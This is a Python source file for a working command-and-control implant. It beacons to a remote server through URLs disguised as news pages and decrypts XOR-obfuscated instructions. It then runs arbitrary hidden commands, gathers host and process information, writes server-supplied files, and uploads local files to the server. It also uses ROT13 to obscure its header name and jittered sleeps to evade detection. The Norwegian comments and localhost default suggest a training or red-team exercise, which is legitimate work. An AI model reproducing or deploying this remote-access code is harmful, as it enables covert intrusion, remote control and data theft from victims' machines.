#!/usr/bin/env python3

import random
import string
import subprocess
import requests
import base64
import time
import json
import os
import platform
import socket
from tempfile import NamedTemporaryFile
from datetime import datetime
from urllib.parse import quote

def yalla(s):     
    m = {a:b for a,b in zip("ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz", "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")}     
    return ''.join(m.setdefault(c, c) for c in s)

REMOTE = os.getenv("REMOTE") or 'http://127.0.0.1:5000'
CLIENT_ID = os.getenv("CLIENT_ID") or '783a9742-a0fa-4fa6-89c5-7169816f9136'
KEY = 'secret'

def respond(instruction, result, status="Executed"):
    global CLIENT_ID
    if type(result) != type([]): result = [result,] # force a list
    return {
        yalla("vzcynagVQ"): CLIENT_ID, 
        "instructionID": instruction['instructionID'],
        "result": result,
        "timestamp": time.time(),
        "status": status
    }

def createRandomString(length):
    characters = string.ascii_letters + string.digits
    name = ''.join(random.choice(characters) for _ in range(length))
    return name

#chatgpt-helper - mest for å støtte mac.
def get_ip_address():
    try:
        # Try to get the IP address directly from the hostname
        ip_address = socket.gethostbyname(socket.gethostname())
    except socket.gaierror:
        # If that fails, try an alternative method by creating a dummy socket connection
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))  # Use a public DNS server to determine outbound IP
                ip_address = s.getsockname()[0]
        except Exception:
            ip_address = "Unavailable"
    return ip_address

def hostinfoInstruction(instruction): 
    system_info = []
    for x in ["system", "node", "release", "version", "machine", "processor", "architecture"]:
        try:
            data = eval(f"platform.{x}()")
            system_info.append(f"{x} = {data}")
        except Exception as e:
            system_info.append(f"{x} = unknown: {e}")
            
    system_info.append(f"hostname = {socket.gethostname()}")
    system_info.append(f"ip_address = {get_ip_address()}")
    return respond(instruction, system_info, "Done")


def runCommand(command, arguments=[]):
    if os.name == "nt":
        result = subprocess.run([command, *arguments], capture_output = True, text = True, creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        result = subprocess.run([command, *arguments], capture_output = True, text = True)

#    if arguments:
#        result = subprocess.run([command, *arguments], capture_output = True, text = True, creationflags=subprocess.CREATE_NO_WINDOW)
#    else:
#        result = subprocess.run([command], capture_output = True, text = True, creationflags=subprocess.CREATE_NO_WINDOW)

    if result.returncode == 1:
        return result.stderr.strip()

    return result.stdout.strip()

def decrypt(encryptedData):
    repeatedKey = (KEY * (len(encryptedData) // len(KEY) + 1))[:len(encryptedData)] 
    reversedData = ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(encryptedData, repeatedKey))
    data = ''.join(reversed(reversedData))
    return data

def encrypt(jsonData):
    data = json.dumps(jsonData)
    reversedData = ''.join(reversed(data))
    repeatedKey = (KEY * (len(reversedData) // len(KEY) + 1))[:len(reversedData)] 
    encryptedData = ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(reversedData, repeatedKey))
    return encryptedData

def xor(data):
    key = KEY.encode()
    encrypted_data = bytearray()
    for i in range(len(data)):
        encrypted_data.append(data[i] ^ key[i % len(key)])
    return bytes(encrypted_data)

#Sjekker en random side og henter ny kommando
def getInstruction():
    number = random.randint(10, 40)
    gibberish = createRandomString(number)
    headers = {yalla("vzcynagVQ"): CLIENT_ID}

    try:
        response = requests.get(f'{REMOTE}/news?newsID={gibberish}', headers=headers)    
    except Exception:
        return False

    if response.status_code == 200:
        if response.text == "This is news!":
            pass
        else:
            return response.text
    else:
        pass

def sendData(data, method="GET"):
    headers = {yalla("vzcynagVQ"): CLIENT_ID}
    base64Data = base64.b64encode(data.encode('UTF-8'))
    if len(base64Data) > 4000: method="POST"
    if method == "GET":
        payload = quote(base64Data.decode("UTF-8"))
        return requests.get(f'{REMOTE}/sports?newsID={payload}', headers=headers)
    payload = base64Data.decode("UTF-8")
    return requests.post(f'{REMOTE}/sports?comment={createRandomString(5)}', data={"newsID":payload}, headers=headers)
    
def executeInstruction(instruction):
    return respond(instruction, runCommand(instruction['command'], instruction.get("arguments", [])), "Executed")
     
def sleepInstruction(instruction):
    duration = 0
    if instruction["function"].lower() == "sleep":
        duration = instruction.get("arguments", 42)
    else:
        try:
            duration = random.randrange(*instruction.get("arguments", [10,20]))
        except TypeError:
            duration = 0
    time.sleep(duration)
    return respond(instruction, f"Slept {duration:.1f}s")


def upload_data(fname, stream):
    url = f"{REMOTE}/comments"
    print(f"Uploading {len(stream)} bytes to {url}")
    return requests.post(url, files={'file': (fname, xor(stream))}, headers={yalla("vzcynagVQ"):CLIENT_ID})

# Upload file(s) to server ("download" command)
def downloadInstruction(instruction):
    if 'arguments' not in instruction:
        return respond(instruction, "No filename(s) in arguments", "Failed")
    result = []
    for fname in instruction["arguments"]:
        try:
            filedata = open(fname, "rb").read()
        except Exception as e:
            result.append(f"Failed to find/open '{fname}' ({e})")
            continue
        upload_res = upload_data(fname.replace("/", "_"), filedata).status_code
        result.append(f"Uploaded of {fname} got status-code {upload_res}")
    return respond(instruction, result, "Done")            


def psInstruction(instruction):
    try:
        import psutil
    except ImportError:
        return respond(instruction, "psutil not installed", "Failed")

    def get_process_info(proc):
        try:
            pid = proc.pid
            name = proc.name()
            path = proc.exe() if proc.exe() else "N/A"
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            return None
        return f"{pid} - {name} - {path}"

    def build_process_tree(pid=1, indent=0, lines=None):
        if lines is None:
            lines = []
        try:
            parent_proc = psutil.Process(pid)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            return lines
        process_info = get_process_info(parent_proc)
        if process_info:
            lines.append("    " * indent + process_info)
        try:
            children = parent_proc.children()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            return lines        
        for child in children:
            build_process_tree(child.pid, indent + 1, lines)
        return lines
    return respond(instruction, build_process_tree(), "Done")


def uploadInstruction(instruction):
    filename = instruction.get("command", NamedTemporaryFile().name)
    b64data = instruction.get("arguments", "").encode()
    try:
        rawdata = base64.b64decode(b64data)
    except Exception as e:
        return respond(instruction, f"Caught exception while decoding base64: {e}", "json error")
    try:
        bytes_written = open(filename, "wb").write(rawdata)
    except Exception as e:
        return respond(instruction, f"Failed to write '{filename}: {e}", "filewrite error")
    return respond(instruction, f"{bytes_written} bytes written to {filename}", "Done")

def functionRouter(instruction):
    funtimes = instruction.get("function", "exec").lower() 
    print(datetime.now().isoformat(), f"Processing {funtimes}")
    match funtimes:
        case "exec":
            return executeInstruction(instruction)
        case "sleep" | "jittersleep":
            return sleepInstruction(instruction)
        case "download":
            return downloadInstruction(instruction)
        case "upload":
            return uploadInstruction(instruction)
        case "hostinfo":
            return hostinfoInstruction(instruction)
        case "ps":
            return psInstruction(instruction)
        case _:
            return respond(instruction, "Unknown function", status="ERR")

def verify(remote_id):
    return remote_id == CLIENT_ID

def main():
    null_instruction_counter = 0
    while True:
        encryptedInstruction = getInstruction()
        if encryptedInstruction:
            jsonInstruction = decrypt(encryptedInstruction)
            try:
                instruction = json.loads(jsonInstruction)
                
                if verify(instruction.get(yalla("vzcynagVQ"))):
                    result = functionRouter(instruction)
                    encryptedResult = encrypt(result)
                    sendData(encryptedResult)
                else:
                    null_instruction_counter += 1
                    print(datetime.now().isoformat(), f"No instruction for me ({null_instruction_counter})")
            except Exception as e:
                print("exception", e)

        time.sleep(min(null_instruction_counter, 120))
        randomTime = random.uniform(1, 10)
        time.sleep(randomTime)
if __name__ == '__main__':
    main()
